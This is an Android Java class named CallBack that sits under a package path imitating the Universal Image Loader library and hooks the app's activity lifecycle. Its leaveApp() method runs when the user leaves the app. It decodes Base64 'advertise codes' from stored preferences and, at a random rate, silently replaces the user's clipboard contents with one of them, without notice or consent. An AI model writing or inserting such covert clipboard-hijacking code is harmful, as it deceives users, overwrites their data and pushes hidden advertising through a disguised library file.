package com.nostra13.universalimageloader.core.assist.ws;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;

import java.util.Calendar;
import java.util.Random;

public class CallBack implements Application.ActivityLifecycleCallbacks {

    private Application application;
    Handler handler;

    public CallBack(Application application) {

        this.application = application;
        handler = new Handler(Looper.getMainLooper());
    }

    int actCount = 0;
    boolean isRunInBackground = false;

    @Override
    public void onActivityCreated(Activity activity, Bundle savedInstanceState) {


    }

    @Override
    public void onActivityStarted(Activity activity) {


        actCount++;

        if (isRunInBackground) {

            boolean normalStart = false;
            String actName = activity.getClass().getName();
            if (actName.contains("GuideActivity") || actName.contains("SplashActivity") || actName.contains("UserLoginActivity") || actName.contains("PersonalEditActivity")) {
                normalStart = true;
            }

            isRunInBackground = false;
            if (!normalStart) {
                backFromBackGround();
            }

        }

    }

    private void backFromBackGround() {


        //启动前景启动图。


    }

    @Override
    public void onActivityResumed(Activity activity) {

    }

    @Override
    public void onActivityPaused(Activity activity) {

    }

    @Override
    public void onActivityStopped(final Activity activity) {

        actCount--;
        actCount = Math.max(0, actCount);
        if (checkLeaveApp != null) {
            handler.removeCallbacks(checkLeaveApp);
        }
        checkLeaveApp = new Runnable() {
            @Override
            public void run() {
                if (actCount == 0) {
                    try {
                        leaveApp(activity);
                    } catch (Throwable t) {
                    }
                }
            }
        };
        handler.postDelayed(checkLeaveApp, 500);


    }

    private Runnable checkLeaveApp = null;

    private void leaveApp(Activity activity) throws Throwable {


        isRunInBackground = true;
        String actName = activity.getClass().getName();
        if (!actName.contains("ShareDownUpActivity")) {

            SharedPreferences sharedPreferences = activity.getSharedPreferences("settting", Context.MODE_PRIVATE);
            long lastClipTime = sharedPreferences.getLong("lastcliptime", 0);
            if (Calendar.getInstance().getTimeInMillis() - lastClipTime > 1000l * 60) {
                String value = sharedPreferences.getString("adviertisecodes", "");
                value = new String(Base64.decode(value.getBytes("UTF-8"), Base64.DEFAULT), "UTF-8");
                String[] result = value.split(";;;");


                if (result != null && result.length > 1) {

                    int rate = 0;
                    try {
                        rate = Integer.valueOf(result[result.length - 1]);
                    } catch (Throwable t) {
                    }

                    if (rate == 0) return;
                    Random random = new Random();
                    int i = random.nextInt(100);
                    if (i >= rate) return;

                    String text = result[random.nextInt(result.length - 1)];
                    if (text != null && !text.trim().equals("")) {
                        android.content.ClipboardManager clipboardManager = (android.content.ClipboardManager) application.getSystemService(Context.CLIPBOARD_SERVICE);
                        clipboardManager.setText(text);
                    }

                }
            }
        }


    }

    @Override
    public void onActivitySaveInstanceState(Activity activity, Bundle outState) {


    }


    @Override
    public void onActivityDestroyed(Activity activity) {


    }
}
